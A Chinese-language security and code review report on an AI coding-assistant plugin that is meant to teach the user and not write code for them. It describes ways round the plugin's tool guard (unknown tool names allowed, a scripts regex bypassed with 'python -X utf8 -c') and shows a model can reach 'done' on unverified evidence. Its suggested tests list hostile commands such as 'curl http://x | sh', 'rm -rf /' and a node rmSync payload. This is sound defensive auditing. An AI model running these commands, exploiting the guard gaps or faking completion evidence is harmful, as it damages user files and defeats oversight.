**修复过程（probe53/54 → probe-final5）**：先只覆盖了 `plando_transition` 的 reject 和 `plando_check` 的 declare/run，6 次不同拒绝里只有 1 次留痕；**最终一次改动把剩余 5 个入口（`plando_card` / `plando_scaffold` / `plando_clarify` / `plando_project` / `plando_idea`）一起补上了**，实测 8/8 全留痕。修法和这里建议的一致：在 `run()` 的 catch 里统一补日志。

### M3　错误文本实测 292 字（契约上限 160）　【当前工作树已修，见 §7】

> 修法就是「`fail()` 也过 `errText`」。现在 5 个工具在长路径 + 坏 `state.json` 下实测全部 **160 字**。保留原文作为回归依据。

`CONTRACT.md:233`：「不超过 160 字」。`tools.js:40 errText` 确实按 160 截断，`policy.js:30 truncate` 也按 160 截断——**但 `fail()`（`99591fe` 引入）对已经以 `plando：` 开头的文本原样透传，不再截断**：

```js
function fail(why, next) {
  const text = String(why ?? '').trim();
  if (text.startsWith('plando：')) throw new Error(text);   // ← 绕过 errText
  throw new Error(errText(text, next));
}
```

而 `project.js:69` 的下层 reason 自带绝对路径 + JSON 引擎消息：

```js
`plando：${label} ${file} 不是合法 JSON（${err.message}）——先备份该文件再人工修回，不要删除重置，否则丢失项目历史。`
```

实测（probe16，故意用长目录名）：

```
plando_transition  行长度 = [292] 超 160: true
plando_card        行长度 = [292] 超 160: true
plando_scaffold    行长度 = [292] 超 160: true
plando_status      行长度 = [302,157,60,49,56,66,49] 超 160: true
首行: plando：项目状态 C:\Users\…\a-very-long-directory-name-…\another-long-segment-here\proj\.plando\state.json 不是合法 JSON（…）——先备份该文件再人工修回，不要删除重置，否则丢失项目历史。
```

注意：**修复 `99591fe` 的双前缀问题是对的，但副作用是长度不受控**。两条约束（不能双前缀 / ≤160）都对，只是实现里还差一个「只截断、不重塑」的分支。

修法：`fail()` 里加一个 `truncatePlando(text)`——保持 `plando：…——下一步：…` 形状与结尾的下一步，只截中间；或者让 `project.js` 的 reason 不带绝对路径（用相对路径或 `path.basename`）。

### M4　证据只校验形状，不校验「真的做过」　【当前工作树部分已修，仍未闭合】

`99591fe` 上 `cards.js:189` 的判据：

```js
if (!isPlainObject(evidence) || !['check','files'].includes(evidence.kind) || !isNonEmptyString(evidence.summary))
```

也就是「`kind` 是两个枚举之一 + `summary` 非空」。**不校验 summary 是不是可观察现象，也不校验 `checks.json` 里是否真有这条检查、是否真的跑过。**

实测（probe7 #3 / probe9 #1 / probe2 #2）：

```
done({"kind":"files","summary":"我懂了"}) → 卡片 c1 已 done。
落盘 evidence = {"kind":"files","summary":"我懂了","at":"…"}
done({"kind":"check","summary":"我懂了"}) → 已 done（checks.json 不存在）
Q4) 没跑过 check 直接 done → 卡片 c1 已 done。 checks.json 存在: false
```

`ship_pass` 同理（`state.js:281` 只 `checkText(payload,'explain')`）：

```
ship_pass(explain="好了") → 已推进：ship → done（ship_pass）
terminal = {"kind":"done","reason":"","at":"…"}
```

**叠加 L1 之外的零产出路径（probe22）**：全部卡 `downgrade`（理由写「时间不够」）→ `cards_done` → `ship_pass{offlineOk:true,selfChange:true,explain:'好了'}` → `stage=done`：

```
B) downgrade c1 → 卡片 c1 已 downgrade。
B) downgrade c2 → 卡片 c2 已 downgrade。
B) cards_done → 已推进：build → ship（cards_done）
B) ship_pass（全自证）→ 已推进：ship → done（ship_pass）
B) 最终 stage = done | terminal = {"kind":"done",…}
B) 项目里有没有一行用户代码: [ 'IDEA.md', 'TECH.md' ]      ← 只有两个渲染产物
B) 有没有跑过任何检查: false
B) plando_status → · 阶段：已完成（done） | · 下一步：项目已结束；要重做请传 reopen（带 reason）
```

「一行代码没写、一次检查没跑、全靠自己填 true」= 项目 done。人格提示词里写着「只认证据，不认我懂了」，**但工具层没有拦截，全靠模型自觉**。

**当前工作树进度（probe-final5）**：

- ✅ `{kind:'check',summary:'我懂了'}` → 现在被拒（`cards.js checkEvidenceObservable`：`证据太短，写清你看到了什么…`）；
- ❌ `{kind:'check',summary:'跑了 vite build，退出码 0'}`（**从没真跑过**）→ `卡片 c1 已 done。`——它只是「字数够、不是纯空话」，**没有任何一条把它和 `checks.json` 里那次真实 `run` 的 `exitCode` 对上**；
- ❌ 全卡 `downgrade` → `cards_done` → `ship_pass{explain:'好了'}` → `stage=done`，项目文件 `["IDEA.md","TECH.md"]`，`checks.json` 不存在。

所以 M4 从「完全不校验」变成了「只挡最离谱的空话」，**结论不变**。

期望（不需要做到完美，做到「自证成本 > 手写成本」即可）：

- `evidence.kind === 'check'` 时，`checks.json` 里必须有该 id，且**最近一次 `run` 的 exitCode === 0**（`checks.js` 已经在 `runCheck` 里拿到了结果，落 state 时顺手记一笔即可）；
- `evidence.summary` 复用 `state.js` 已有的 `checkDoneObservable`（就是判「功能都实现了」为空话的那把尺）——**这个函数早就写好了，`cards.js` 目前用的是一份自己抄的精简版**；
- `ship_pass` 的 `explain` 同样过一遍 `checkDoneObservable`，并要求 `state.ship` 里的 `offlineOk` / `selfChange` 有对应的可核对内容（比如至少一条 `evidence` 或一次 `check` 记录）；
- 「全部卡片 downgrade」时 `cards_done` 应该要求一句整体降级理由（进 `state.downgrades`），或至少让 `formatStatus` 在 done 时显示「本项目的 N 张卡全部降级」。

### M5　`paused` 只是装饰，且 `drop` 会清掉它　【契约已消解，见 §7】

`CONTRACT.md:27`：「`paused` **不是阶段**，是任意非终态上的一个布尔标志」，`PLAN.md:82` 写的是 `pause/resume` 同阶段。`99591fe` 的契约**没有**明说「暂停时禁止推进」，但：

- `policy.js:176` 的守卫文案是「项目已暂停……**下一步：先传 plando_transition event=resume 恢复，再按阶段推进**」——这是对模型的明确承诺；
- `format.js:72` 显示「· 提醒：项目已暂停，恢复请传 plando_transition event=resume」。

实测（probe4 Q3 / probe9 #4）：

```
pause → paused = true
Q3) 暂停后 clarify_done → 已推进：clarify → idea（clarify_done）   ← 阶段照走
8) 暂停状态下 clarify record → 已记录（detail，第 1 轮）           ← 照写
Q3) stage 现在 = idea | paused = true                              ← paused 还挂着，但已经推进了
4) paused 状态下 drop → 已推进：idea → dropped（drop）
4) 最终 stage = dropped | paused = false                           ← drop 把 paused 清掉了
```

`state.js:482`（`drop`）和 `state.js:492`（`reopen`）都写了 `draft.paused = false`。也就是说「暂停」在状态机里没有任何约束力，只影响守卫拒绝**写工具**时的文案。

修法（二选一，别两头都不做）：要么让所有非 `resume` 事件在 `paused` 时拒绝（契约补一行），要么把文案改成「已暂停（不影响推进，只影响写工具）」，别让文档和实现对不上。

**当前工作树走了第二条**（`CONTRACT.md` §2 的 `pause` 行加了「语义是「守卫层提示先 resume」，不冻结状态机」）。这条路成立，但**还剩一处没跟上**：`policy.js:176` 的拒绝文案仍是「下一步：**先传 plando_transition event=resume 恢复，再按阶段推进**」，而契约现在说暂停不阻止推进——模型会为了一个不必要的动作绕一步。建议改成「项目已暂停（不阻止推进，只影响写工具）——下一步：<阶段建议>」。

### M6　阶段名硬编码 + 指向不存在的 action　【当前工作树已修，见 §7】

`99591fe` 上 `cards.js:20` / `checks.js:26` 的 `reason()` 把阶段写死：

```js
const head = '现在是「边做边学」阶段，';   // 不管实际在哪个阶段
```

实测（probe9 #2/#3，项目在 **ship** 阶段）：

```
2) ship 阶段跑未声明检查:
· 检查 c404：未通过｜退出码 —
· 理由：plando：现在是「边做边学」阶段，检查 c404 没有在 checks.json 里声明…
2) 文案里的阶段 = 边做边学（错，实际是收尾）
```

`format.js:247` 更直接——提示调用一个**枚举里不存在**的 action（当前行号是 `format.js:261`，另 `format.js:193` 的卡片正文里也写了 `action=verify`）：

```js
if (!ok) lines.push('· 下一步：先修到退出码 0，再把输出作为证据传 plando_card action=verify。');
```

而 `plando_card` 的 `action` 枚举是 `['start','learn','do','declare','done','downgrade','list']`（`tools.js:479`），`verify` 不在里面。模型照做会拿到「不认识的 action：verify」。实测：

```
A) 是否引用了不存在的 action=verify: true
```

修法：`cards.js`/`checks.js` 的 `reason()` 接受阶段标签参数（或在 tools 层重新包一层）；两处 `action=verify` 都改成 `action=done（evidence.kind='check'）`。

**已按上面的修法改了**（probe-final5 复核）：

- `checks.js` 的 `head` 改成空串、阶段由调用方给；`tools.js` 的闸门文案本来就用 `STAGE_LABELS[state.stage]`；
- 两处 `action=verify` 都改成了 `action=done（evidence.kind=check）`；
- 实测 ship 阶段报错：`含「边做边学」= false`、`含「收尾」= false`（这里是对的——checks 的 reason 只说事由，阶段由上层拼）、`含 action=verify = false`。

### 附：`init` 落在非空目录本身可以接受

补一个更轻的变体（probe8 E）：目录里有 `main.py` / `node_modules` 时 `init` 成功，用户文件不动，只多出 `.plando/`：

```
E) 在非空目录 init → 已立项：busy（…\busy）
E) 用户文件还在: true | 新增: [ '.plando', 'main.py', 'node_modules' ]
```

「在已有目录里开工」是合理需求，这条不算缺陷。问题只在于「同名产物会被渲染覆盖」（G4 复现 ①）——所以 G4 的修法应该是「拒绝覆盖已有产物文件」，而不是「禁止 init 到非空目录」。

---

## 3. 低危与观察

### L1　重复卡 id → 卡 md 覆盖 + 卡片死锁　【当前工作树已修，见 §7】

`validateChooseBuild`（`state.js:259`）不查 id 唯一性。实测（probe17，`99591fe` 上）：

```
1) 重复 id 的 choose_build → 已推进：decide → build（choose_build）
1) 磁盘 cards = [["dup","第一张",["t1"]],["dup","第二张",["t2"]]]
1) cards 目录 = [ 'dup.md' ]
1) dup.md 首行 = # 第二张      ← 第二张覆盖第一张
2) start dup → 磁盘状态 = [["dup","第一张","doing"],["dup","第二张","todo"]]
2) done dup  → 磁盘状态 = [["dup","第一张","done"],["dup","第二张","todo"]]
2) cards_done → plando：现在是「边做边学」阶段，还有 1 张卡没收尾（dup）——下一步：先用 plando_card done 或 downgrade 收尾，再传 cards_done
2) 反复 done 第二张 → plando：…卡片 dup 现在是 done，不能直接 done——下一步：先 start 这张卡…
```

`startCard` / `doneCard` 都是 `findIndex(c => c.id === id)` → **永远只命中第一张**。第二张卡永远 `todo`，`cards_done` 永远过不去，而提示里的解法（`done`/`downgrade`）对第二张无效。模型只能去猜 `revise`（把全部卡标 stale 但 id 还是重复）或 `drop`。

修法：`choose_build` 里 `new Set(ids).size === ids.length` 一行。

**当前工作树已修**：`state.js:275 firstDuplicate` + `state.js:306`。复核（probe28）：`卡片 id 重复：dup——删掉重复的卡，或给它们不同的 id`。

### L2　重复 tech id：`find` 取第一条，归属判断自相矛盾　【当前工作树已修，见 §7】

`techItemOf`（`tools.js:682`）用 `items.find(item => item.id === techId.trim())`。`validateTechItem`（`state.js:225`）只要求 id「是非空字符串」，不要求唯一。

实测（probe7 #1，`99591fe` 上）：

```
1) tech_ok 带重复 id → 已推进：tech → decide（tech_ok）
1) 磁盘 items = [["t1","user"],["t1","ai"]]
1) choose_build → 已推进：decide → build
1) scaffold techId=t1（第一条 owner=user）→ plando：TECH 项 t1 的归属是 user，不是 ai——下一步：只有「可交给 AI」的技术项才能写脚手架…
```

明明清单里有 `owner=ai` 的 `t1`，但 `scaffold` 报「归属不是 ai」——模型会以为自己的归属标错了，实际是 `find` 取了第一条。

修法：`tech_ok` 校验 id 唯一（同 L1）。

**当前工作树已修**：`state.js:267` 的 `firstDuplicate` 检查。复核（probe28）：`技术项 id 重复：t1——删掉重复项，或给它们不同的 id`。

### L3　灵感 id 同毫秒必撞　【当前工作树已修】

`tools.js:249`：`id: \`idea_${Date.now().toString(36)}\``。毫秒粒度，同一毫秒内两次 `add` 必然同 id。

实测（probe13 A，把 `Date.now` 钉死）：

```
A1) add 甲 → 已记下（idea_midc1z40）：甲
A2) add 乙 → 已记下（idea_midc1z40）：乙
A) ideas.json = [["idea_midc1z40","甲"],["idea_midc1z40","乙"]]
A) id 重复: true
A) drop 该 id → 已删除：甲 | 剩余 = ["乙"]        ← 删一条，实际删的是第一条
```

真实环境下连续 300 次 `add` 没撞（`probe19`：300 条全唯一），并发 8 次也没丢（`probe23`：8 条都在，因为 `execute` 是串行的）。所以这是低概率问题——但**钉死时钟的测试环境、或将来加了并发调用，就会撞**，且撞了之后 `park`/`drop` 会作用在错误的那条上。

修法：`idea_${Date.now().toString(36)}${Math.random().toString(36).slice(2,6)}`，或落盘后再查重。

**当前工作树已修**：`nextIdeaId(ideas)` 先查重、撞了就加 `_2` / `_3` 后缀。复核（probe-final3，同样钉死 `Date.now`）：2 条 / **2 个唯一 id**。

### L4　无输入规模上限　【仍成立】

`clarify answers` 走 `normalizeObject`，直接把任意大的对象塞进 `draft.clarify.answers` 再 `saveState`：

```
7) clarify answers 塞 2MB → 已记录（detail，第 1 轮）。 | state.json 1106 → 2098424 字节
8) scaffold 5MB → 已写 package.json。 | 文件大小 = 5242880
```

`state.json` 2MB 之后每次 `plando_status` 都要读它（守卫每次调用也读一次盘），会明显变慢。`scaffold` 写 5MB 的 `package.json` 也不合理。

修法：`clarify answers` 的 `JSON.stringify` 长度上限（如 8KB）；`scaffold content` 上限（如 256KB）。

### L5　白名单里的 `README.md` / `index.html` 不是「配置文件」　【当前工作树已修】

`PLAN.md:148` 说白名单是「配置/脚手架白名单」，但 `README.md` 是**项目的门面文档**，`index.html` 是**用户要亲手写的第一个页面**（TECH 里通常 `owner=user`）。把它们放进白名单意味着：

- AI 可以通过 `scaffold` 写出一份「参考 README」，绕开「产物由 state 渲染，AI 不手写文档」；
- AI 可以写 `index.html` 的骨架——而「写第一个 HTML 页面」往往正是用户要学的第一步。

这两项与「不代写」的产品价值直接冲突，而它们对「让项目跑起来」并不必需（`npm create vite` 会生成）。

建议：从白名单删掉 `README.md` 和 `index.html`，或给它们加内容模板校验。

**当前工作树已修**：这两项已从 `WHITELIST` 移除（现在只剩 7 项，全是声明式配置）；`vite.config.js` / `vite.config.ts` 也一并删了。复核：`README.md → 「README.md」不在白名单（只有 7 个配置文件名）`。

### L6　`VERIFY.md` 不在 `git.ARTIFACT_PATHS`　【当前工作树已修】

`99591fe` 上 `git.js:15`：

```js
export const ARTIFACT_PATHS = Object.freeze(['IDEA.md', 'TECH.md', 'HANDOFF.md', 'CHANGE-GUIDE.md', '.plando']);
```

**没有 `VERIFY.md`**，而 `renderArtifacts` 会写它，`PLAN.md` 的 A6 验收标准是「每次推进在项目仓库里产生一次只含模式产物的 commit」。

实测（probe11，`autoCommit:true` + 真 git 仓库）：

```
choose_verify → 已推进：decide → verify（choose_verify） | VERIFY.md 存在: true
git status（推进后）:
?? VERIFY.md                       ← 模式产物留在工作区，没进 commit
git log: plando(verify): choose_verify / plando(decide): tech_ok / …
已跟踪文件: [ '.plando/log.jsonl', '.plando/state.json', 'IDEA.md', 'TECH.md', 'keep.txt' ]
VERIFY.md 被跟踪: false
```

用户开了 `autoCommit` 以为产物都在版本里，实际上 `VERIFY.md` 一直是未跟踪的游离文件。

修法：`ARTIFACT_PATHS` 加 `'VERIFY.md'`（一行）。

**当前工作树已修**：`ARTIFACT_PATHS` 现在是 `['IDEA.md','TECH.md','VERIFY.md','HANDOFF.md','CHANGE-GUIDE.md','.plando']`，`test/git.test.js` 的断言也同步了（一度是全套唯一一个红测试，现已修）。

### L7　`clarify record` 与 transition 路径不一致　【仍成立】

`tools.js:401`：

```js
appendLog(dir, deps, { kind:'clarify', action:'record', recordKind: kind });   // 先记日志
const saved = deps.project.saveState(dir, draft);                              // 再落 state
return `已记录…`;
```

没有 `renderArtifacts`、没有 `autoCommit`。而 `afterTransition` 是「落 state → 渲染 → 日志 → 提交」。影响小（下一次 transition 会把产物重渲染），但意味着「`clarify record` 改了 state 却不更新 IDEA.md / 不提交」——如果用户此时看 git 历史，会看到 state 变了但产物没变。

顺带：这里的顺序是「日志在前、落盘在后」，与 `afterTransition` 相反。两处对「先日志还是先落盘」的取舍不一致，将来做崩溃一致性时要统一。

**当前工作树复核（probe-final3）**：仍成立。`clarify record` 前后目录都只有 `['.plando']`，没有 `IDEA.md`、没有 commit。

---

## 4. 查过但**不是** bug 的（避免后人重复投入）

| 编号 | 怀疑点 | 结论 | 证据 |
|---|---|---|---|
| N1 | **伪造 `state.json` 能骗守卫放行写工具吗** | **不能**。`policy.js` 对 `fs-write/shell/dynamic-code/subagent` 是**单调拒绝**，`getStateContext()` 只影响拒绝文案（`denyReasonFor` 里 `state` 只用来填 `label`/`nextAction`/`paused`）。四个危险能力没有任何「状态满足就放行」的分支 | 读码 `policy.js:108-134` + 实测：把 activeProjectDir 指向一个 `stage:'build'` 的伪造项目，`guard({name:'write'})` 仍然返回拒绝文本 |
| N2 | `execute` 会抛异常吗（「永不抛异常」契约，含 async 分支） | **不会**。`run()` 是 `try { return String(await body(input)) } catch`，异步 reject 也被吞；参数不是对象时提前返回 | 对 8 个工具逐一喂 `null / undefined / 0 / '' / 'x' / [] / {action:null} / {action:{}} / {action:'init',dir:123} / {event:'clarify_done',payload:[]}`，全部返回字符串，无一抛出（probe2 #11） |
| N3 | 守卫会连累只读工具吗 | **不会**。`read` 与 `unknown` 在第 2 行直接 `return undefined`，且这行在「读状态」之前——读类调用不会为守卫额外读一次盘 | `policy.js:129` + 实测 `read/grep/glob/list/web_*` 全放行 |
| N4 | `autoCommit` 会不会把用户暂存的文件带进 commit | **不会**。`git add -- <白名单>` + `diff --cached --name-only -- <白名单>` + `commit -- <白名单>`，pathspec 收窄两次 | 实测先在仓库里 `git add user-code.js`，autoCommit 后 `user-code.js` 仍在暂存区未进 commit（`user-code.js 是否进 commit: false`） |
| N5 | 坏 state 会被重置吗 | **不会**。`loadState` 对损坏只返回 `{ok:false, reason}`，从不写回 | 实测：故意破坏 `state.json`，调 8 个工具后文件内容原样（`坏 state 仍在: true`） |
| N6 | 没有 `state.json` 时 `plando_check` 会不会执行 | **不会**（fail-closed） | 实测：`plando_check` 在空目录 → 「state.json 不存在」，且探针文件 `p5.txt` 未被创建 |
| N7 | `pick` 的三问能用 `1` / `'true'` 糊过去吗 | **不能**。`answers[key] !== true` 是严格比较，`1`、`'true'`、`{}` 都不算 | 实测 `{want:1,now:'true',solo:{}}` → 「立项三问还没全过（缺 want、now、solo）」 |
| N8 | `pick` 会覆盖已有项目吗 | **不会**。目标目录已有 `.plando/state.json` 时拒 | 实测：「…已有项目状态（阶段 build）——用 plando_project action=open 打开它，不要重建」 |
| N9 | `plando_transition event='pick'` 能绕过三问吗 | **不能**。`transitionTool` 显式拦 `pick` | `tools.js:433` + 实测 |
| N10 | `scaffold` 的路径防护有洞吗（`..` / 绝对路径 / 符号链接 / 覆盖） | **没有**。绝对路径、盘符、`..`、白名单、`owner==='ai'`、realpath containment、逐级 symlink 检查、不覆盖已有不同内容、原子写，七道都有 | 读码 + 实测 `../escape.json` / `src/app.js` / `techId:'t9'` / 已有 `package.json` 全部拒绝 |
| N11 | 守卫的工具名分类能覆盖常见变体吗 | **攻击面上不能**（见 L8 观察），但**测试断言的四类前缀都命中了** | 实测：`write/edit/apply_patch/str_replace_editor`→fs-write，`bash/pwsh/terminal/shell_exec`→shell，`run_code/code_interpreter/notebook/eval_js`→dynamic-code，`subagent/workflow/task`→subagent；`fs_write`/`powershell`/`mcp__*`→unknown 放行 |
| N12 | `formatRecover` 会崩吗 | 不会。`plando_status` 读不出状态时返回多行恢复指引，不抛 | 实测 209/302 字多行文本，正常返回 |
| N13 | 错误文本会叠两层 `plando：` 吗 | **不会**（`99591fe` 已修）。这是回归点，不是当前缺陷 | 实测所有拒绝路径 `plando：` ×1、`——下一步：` ×1 |

### L8（观察）守卫只按名字前缀分类，未知名一律放行　【大幅收窄，仅剩无害项】

`policy.js:52 classifyTool` 是纯前缀匹配，未命中 → `'unknown'` → **放行**。**`99591fe` 上实测**：

```
powershell    unknown  放行        cmd          unknown  放行
exec          unknown  放行        exec_command unknown  放行
python        unknown  放行        node         unknown  放行
fs_write      unknown  放行        mcp__filesystem__write_file  unknown  放行
mcp__shell__run  unknown  放行     spawn_teammate  unknown  放行
present / todo_write / create_goal / enter_plan_mode / update_plan  unknown  放行
write / edit / apply_patch / bash / pwsh / run_code / subagent / workflow → 拒绝
```

`fs_write`（下划线）和 `write_file`（另一个名字）行为相反——纯粹因为前缀表里写的是 `write`。

**这不是当前可用的绕过**：预设根本没挂这些工具（`cordis.patch.yml` 里没有 bash/pwsh/subagent，`tool-fs` 关了 write/edit），模型看不到它们。但如果将来：换个 DSH 版本、加了 MCP 文件系统 server、或用户自己开了 `write` 之外名字的写工具——守卫会静默放行。

**最终工作树已大幅收窄**（probe-final5 / probe70）：`fs_write` / `mcp__filesystem__write_file` / `powershell` / `cmd` / `exec` / `spawn_teammate` **现在都拒**，只剩 `node` / `present` / `read` / `grep` 放行。这条从「结构性隐患」降级为「已知无害放行」，可以进 KNOWN-ISSUES。

**但仍然建议**：把 `unknown` 从「放行」改成「放行但记一次日志」，或维护一个「已知只读」白名单、其余 fail-closed。另外 `mcp__*__*` 值得单独一条规则。

---

## 5. 测试覆盖盲区（这些 bug 为什么全绿）

现有 `test/tools.test.js` 断言了：8 个工具与顺序、definition 形状、`execute` 对坏参数返回字符串、status 恢复文案、init→status、idea add/list、scaffold 拒 `owner≠ai` 与白名单外路径、完整链路日志 ≥4 行、`card done` 拒绝空证据、`check declare+run`、`handoff`/`revise` 产物、单层 `plando：`/`——下一步：` 前缀。

对照本报告：

- **没有任何一条**把「`declare` 的命令本身」当成攻击面——测试里 `declare` 的命令都是 `node --test …`，天然良性（G1，**最大盲区**）。G1 现在靠 `checks.js` 里的 60 行白名单挡着，**这 60 行一条测试都没有**；
- ~~没有任何一条给卡 id 传 `../`（G3）~~——`test/review-state.test.js` 已覆盖；
- ~~没有任何一条把 `dir` 传相对路径或非项目目录（G4）~~——G4 已修，但仍无测试；
- ~~没有任何一条在产物路径上放一个同名目录制造渲染失败（M1）~~——M1 已修，暂无测试；
- ~~没有任何一条统计「拒绝之后日志有没有新增」（M2）~~——M2 已修（8/8 留痕），但仍无测试守住；
- ~~没有任何一条用超长路径触发 160 字上限（M3）~~——M3 已修；
- **没有任何一条**验证「`evidence.kind='check'` 时检查真的跑过」（M4）——这是 M4 至今半开的原因；
- ~~没有任何一条在 `paused` 状态下尝试推进（M5）~~——契约已改写，不算缺口；
- ~~没有任何一条在 ship 阶段触发 `cards.js`/`checks.js` 的 `reason()`（M6）~~——M6 已修；
- ~~没有任何一条用重复卡 id / 重复 tech id（L1/L2）~~——`test/review-state.test.js` 已覆盖；
- **没有任何一条**测 `scaffold` 的 `scripts` **值**（G2，**唯一还活着的高危，零测试**）。

**关键一句**：当前 `node --test` 是 **341 passed / 0 failed**（定稿时），而 **G2 / M4** 仍然复现。**绿灯不代表安全**——这个测试集守的是「正常流程能跑通」，不是「坏模型跑不通」。写报告期间亲眼看到三次「因为没测试所以没人发现」：`git.js` 加了 `VERIFY.md` 忘了同步断言（红）、`checks.js` 改名常量漏改引用（`ReferenceError`，那条分支没测试走到，绿灯）、以及 §8.5 那个 denylist 洞一路绿灯活到最后（`python -X utf8 -c` 就绕过去了）。

**建议补的最小集**（都能用现有 `test/tools.test.js` 的临时目录 + 假 deps 模式写）：

```js
// G1（现在已修，补的是回归保护——这 60 行白名单没有任何测试，改错一个字符就静默破防）
for (const command of ['node -e "1"', 'cmd /c "echo x"', 'python -c"1"', 'node --require=./x.cjs --test']) {
  assert.match(await card({action:'declare', id:'c1', command, dir}), /不允许|白名单/);
}
assert.match(await card({action:'declare', id:'ghost', command:'node --test', dir}), /没有这张卡/);
// 反向：合法检查不能被误杀
for (const command of ['node --test', 'npm test', 'python -m pytest', 'cargo test']) {
  assert.equal(checksModule.validateCommand(command), null);
}
// G3
assert.match(await transition({event:'choose_build', payload:{cards:[{id:'../x',techIds:['t1'],title:'a'}]}, dir}), /不合法|不允许/);
// M1：把 TECH.md 换成目录后，state 不应推进
fs.mkdirSync(path.join(dir,'TECH.md'));
const before = loadState(dir).state.stage;
await transition({event:'tech_ok', payload:TECH, dir});
assert.equal(loadState(dir).state.stage, before);
// M2
const n = logLines(dir).length;
await card({action:'start', id:'nope', dir});
assert.ok(logLines(dir).length > n);
// L1（已由 test/review-state.test.js 覆盖）
assert.match(await transition({event:'choose_build', payload:{cards:[{id:'dup',…},{id:'dup',…}]}, dir}), /重复/);
```

**最该补的是 G1 那条**——它不是「多一个断言」，而是「这个插件的卖点是否成立」。建议直接写成表驱动（**含已修的部分，防回归**）：

```js
const badCommands = [
  // 已被现在的白名单挡住（回归保护，一条测试都没有 → 改错就静默破防）
  'cmd /c "echo x"', 'powershell -NoProfile -Command "x"', 'sh -c "x"',
  'curl http://x | sh', 'rm -rf /', 'del /f x',
  'node -e "1"', 'node --eval="1"', 'node --eval=1', 'node --print=1', 'node -p=1',
  'python -c"print(1)"', 'python -c1', 'python3 -c"1"', 'py -c"1"',
  'node -r ./x.cjs --test', 'node --require=./x.cjs --test',
  'node --import=./x.mjs --test', 'node --loader=./x.mjs --test',
  'node --test --test-reporter=./x.cjs', 'node --run test',
  'pip install x', 'python -m pip install .', 'cargo run', 'go run ./x.go', 'dotnet run', 'java -jar x.jar',
];
for (const command of badCommands) {
  const text = await card({ action:'declare', id:'c1', command, dir });
  assert.match(text, /不允许|白名单|只允许/, `这条命令应该被拒：${command}`);
}
// 反向断言：合法检查不能被误杀（过度拦截也是 bug）
for (const command of ['node --test', 'npm test', 'python -m pytest', 'cargo test', 'go test ./...']) {
  assert.equal(validateCommand(command), null, command);
}
// G2：scaffold 的 scripts 值（唯一还活着的高危 → 必须有这条）
const hostile = JSON.stringify({ name:'p', scripts:{ test:`node -e "require('node:fs').rmSync('src')"` } });
assert.match(await scaffold({ path:'package.json', content: hostile, dir, techId:'t1' }), /不允许|脚本/);
// G4：dir 必须是绝对路径 / init 不能覆盖已有产物
assert.match(await project_({ action:'init', dir:'..', name:'x' }), /绝对路径/);
fs.writeFileSync(path.join(dir,'IDEA.md'), '# 用户的\n');
assert.match(await project_({ action:'init', dir, name:'x' }), /已经有 IDEA\.md/);
// M4：evidence.kind='check' 时必须有对应的 exitCode 0 记录
assert.match(await card({ action:'done', id:'c1', evidence:{ kind:'check', summary:'跑了 vite build，退出码 0' }, dir }), /没有.*跑过|先跑/);
```

---

## 6. 判决

**v0.1.0 现在不能发。**

这个插件的产品承诺只有一句话：**AI 只教、不代写**。本次审查的出发点是：这个承诺在工具层有没有兜底？

答案分两半。**「AI 不能执行任意代码」这一半，写报告期间已经被补上了**——4 个高危里 G1 / G3 / G4 现在实测关上，`plando_check` 的命令校验从「信任字符串」变成了真正的白名单（11 条攻击命令全拒）。**但「AI 不能替用户写东西」这一半还没关严**：`plando_scaffold` 的白名单收窄了、`scripts` 的键管住了、值也加了一串正则——**但那条正则是「命令名紧邻开关」的形式，插一个 `-X utf8` 就绕过去了**（§8.5 有端到端复现）。

写报告期间另一路改动修掉了 **G1 / G1b / G3 / G4 / M1 / M2 / M3 / M6 / L1 / L2 / L3 / L5 / L6**，大幅收窄了 **L8**，部分修了 **M4**，并用改契约的方式消解了 **M5**。**判决仍是 fix-first**，原因只有两条：

按修复成本 / 收益排序，发布前**必须**做：

1. **G2（`scaffold` 的 `scripts` 值要过 `validateCommand`，而不是正则）**——文件名白名单（7 项）、`scripts` **键**白名单（11 个）、`dependencies` 版本白名单都做了，**只差值的判定方式**。`python -X utf8 -c "open('PWNED.txt','w').write('…')"` 随 `plando_scaffold` 一次调用整份落盘成功（`已写 package.json。`），用户敲 `npm test` → `status=0`、`PWNED.txt 存在=true`（§8.5 / probe-final11）。这条**不需要任何其它漏洞配合**。修法直白：把这里换成 `checks.validateCommand`——我逐条验过，同一批 payload 在那边 7/7 全拒，差距的来源就是「遍历 argv 每个 token」vs「命令名紧邻开关的正则」。
2. **M4（「零产出也能 done」）**——`checkEvidenceObservable` 只挡「我懂了」这类空话，挡不住「跑了 vite build，退出码 0」这种**没真跑过**的描述。要接 `checks.json` 里最近一次 `run` 的真实结果（`exitCode === 0` 才算 `evidence.kind='check'` 成立），`ship_pass` 的 `explain` 也要接。现在的事实是：全卡 `downgrade` → `cards_done` → `ship_pass{explain:'好了'}` → `stage=done`，项目里只有两个渲染产物、`checks.json` 都不存在，而 `plando_status` 会显示「已完成」。这个模式的全部信任都建立在「done 意味着真的做出来了」上。

已在工作树修掉、不必再动：~~G1~~（11 条攻击命令全拒，白名单 + 参数名归一 + 贴值前缀 + `RUN_SUBCOMMANDS` / `RUN_FLAGS` / `SAFE_PY_MODULES`）、~~G3~~（`CARD_ID_RE` + `writeText` containment）、~~G4~~（`dir` 必须绝对路径 + `init` 遇已有产物就拒 + `noteActiveDir` 移出 `resolveDir`）、~~M1~~（render → save）、~~M2~~（8/8 拒绝留痕）、~~M3~~（全部 160 字）、~~M6~~（阶段名与 `action=verify`）、~~L1/L2/L3/L5/L6~~。

可以进 `v0.1.1`，但**要写进 KNOWN-ISSUES 明说**（别让它们变成「文档说拦住了、其实没拦」）：

4. L4（无规模上限）、L7（`clarify record` 不渲染）、`policy.js` 的 `paused` 文案与 §2 新契约不一致；以及 §8.7 末尾列的「放行了但不构成执行」的开关（`node -i` / `--inspect` / `--watch` / `--env-file` / `deno run` / `bun run`）——其中 **`--watch` / `--inspect-brk` 会让 `plando_check` 挂满 60s 超时**，是体验问题不是安全问题，但用户会以为插件卡死了。

**如果只能改两处**：① `scaffold.validateContent` 里对 `scripts.*` 的值直接调 `checks.validateCommand`（§8.5 有逐条对照表，同一批 payload 那边 7/7 全拒）；② M4 的证据接真实 `exitCode`。**G1 / G4 / M2 那三条已经被并发改动修掉了**，现在剩的一条是「机器安全」、一条是「模式可信度」。后者更贴近产品本身：一个能零产出变「已完成」的毕业模式，和代写没有区别。

